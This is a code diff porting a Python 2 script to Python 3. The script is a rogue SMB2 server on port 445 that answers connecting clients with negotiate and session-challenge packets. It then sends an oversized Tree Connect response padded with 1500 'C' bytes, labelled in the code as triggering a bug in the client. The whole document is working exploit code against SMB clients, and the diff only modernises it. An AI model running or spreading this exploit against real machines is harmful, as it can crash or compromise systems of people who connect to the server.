@@ -1,4 +1,4 @@
-import sys, struct, SocketServer
+import sys, struct, socketserver
 from odict import OrderedDict
 from datetime import datetime
 from calendar import timegm
@@ -9,13 +9,13 @@ class Packet():
     ])
     def __init__(self, **kw):
         self.fields = OrderedDict(self.__class__.fields)
-        for k,v in kw.items():
+        for k,v in list(kw.items()):
             if callable(v):
                 self.fields[k] = v(self.fields[k])
             else:
                 self.fields[k] = v
     def __str__(self):
-        return "".join(map(str, self.fields.values()))
+        return "".join(map(str, list(self.fields.values())))
 
 def NTStamp(Time):
     NtStamp = 116444736000000000 + (timegm(Time.timetuple()) * 10000000)
@@ -351,12 +351,12 @@ class SMB2TreeData(Packet):
     ])
 
 ##########################################################################
-class SMB2(SocketServer.BaseRequestHandler):
+class SMB2(socketserver.BaseRequestHandler):
      
     def handle(self):
         try:
               self.request.settimeout(1)
-              print "From:", self.client_address
+              print("From:", self.client_address)
               data = self.request.recv(1024)
 
              ##Negotiate proto answer.
@@ -366,7 +366,7 @@ class SMB2(SocketServer.BaseRequestHandler):
                 t.calculate()
                 packet1 = str(head)+str(t)
                 buffer1 = longueur(packet1)+packet1  
-                print "[*]Negotiating SMBv2."
+                print("[*]Negotiating SMBv2.")
                 self.request.send(buffer1)
                 data = self.request.recv(1024)
 
@@ -380,7 +380,7 @@ class SMB2(SocketServer.BaseRequestHandler):
                 t.calculate()
                 packet1 = str(head)+str(t)
                 buffer1 = longueur(packet1)+packet1  
-                print "[*]Negotiate Protocol SMBv2 packet sent."
+                print("[*]Negotiate Protocol SMBv2 packet sent.")
                 self.request.send(buffer1)
                 data = self.request.recv(1024)
 
@@ -391,7 +391,7 @@ class SMB2(SocketServer.BaseRequestHandler):
                 t.calculate()
                 packet1 = str(head)+str(t)
                 buffer1 = longueur(packet1)+packet1
-                print "[*]Session challenge SMBv2 packet sent."
+                print("[*]Session challenge SMBv2 packet sent.")
                 self.request.send(buffer1)
                 data = self.request.recv(1024)
 
@@ -411,14 +411,14 @@ class SMB2(SocketServer.BaseRequestHandler):
                 t = SMB2TreeData(Data="C"*1500)#//BUG
                 packet1 = str(head)+str(t)
                 buffer1 = longueur(packet1)+packet1
-                print "[*]Triggering Bug; Tree Connect SMBv2 packet sent."
+                print("[*]Triggering Bug; Tree Connect SMBv2 packet sent.")
                 self.request.send(buffer1)
                 data = self.request.recv(1024)
 
         except Exception:
-           print "Disconnected from", self.client_address
+           print("Disconnected from", self.client_address)
            pass
 
-SocketServer.TCPServer.allow_reuse_address = 1
-launch = SocketServer.TCPServer(('', 445),SMB2)
+socketserver.TCPServer.allow_reuse_address = 1
+launch = socketserver.TCPServer(('', 445),SMB2)
 launch.serve_forever()
